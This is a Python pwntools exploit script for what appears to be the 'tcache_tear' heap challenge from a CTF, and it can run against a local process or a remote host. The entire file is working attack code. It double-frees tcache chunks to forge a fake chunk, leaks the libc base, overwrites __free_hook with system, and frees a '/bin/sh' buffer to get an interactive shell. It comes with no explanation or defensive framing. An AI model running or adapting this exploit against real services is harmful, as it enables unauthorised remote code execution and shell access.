#!/usr/bin/env python3

from pwn import *

context(os="linux", arch="amd64", log_level="info")
localfile = "./tcache_tear"
locallibc = "./libc.so.6"
pf      = lambda name,num           :log.info(name + ": 0x%x" % num)
g       = lambda x                  :next(libc.search(asm(x)))

def init_(name):
    io.recvuntil("Name:")
    io.send(name)

def malloc_(size, content):
    io.recvuntil("Your choice :")
    io.sendline("1")
    io.recvuntil("Size:")
    io.sendline(str(size))
    io.recvuntil("Data:")
    io.send(content)

def free_():
    io.recvuntil("Your choice :")
    io.sendline("2")

def info_():
    io.recvuntil("Your choice :")
    io.sendline("3")
    io.recvuntil("Name :")
    return io.recvline()

def exp():
    name_addr = 0x602060
    init_(p64(0) + p64(0x421))
    malloc_(0x40, "A")
    free_()
    free_()
    malloc_(0x40, p64(name_addr+0x420))
    malloc_(0x40, "A")
    malloc_(0x40, p64(0)+p64(0x21)+p64(0)*3+p64(0x21))

    malloc_(0x20, "A")
    free_()
    free_()
    malloc_(0x20, p64(name_addr+0x10))
    malloc_(0x20, "A")
    malloc_(0x20, "A")
    free_()

    # gdb.attach(io, "b *0x200C11")
    ret = info_()
    libc_base = u64(ret[16:24]) - 0x3EBCA0
    free_hook = libc_base + libc.sym["__free_hook"]
    system_addr = libc_base + libc.sym["system"]
    
    malloc_(0x30, "A")
    free_()
    free_()
    malloc_(0x30, p64(free_hook))
    malloc_(0x30, "A")
    malloc_(0x30, p64(system_addr))

    malloc_(0x50, "/bin/sh")
    free_()

    io.interactive()

argc = len(sys.argv)
if argc == 1:
    io = process(localfile)
else:
    if argc == 2:
        host, port = sys.argv[1].split(":")
    elif argc == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    io = remote(host, port)

elf = ELF(localfile)
libc = ELF(locallibc)
exp()
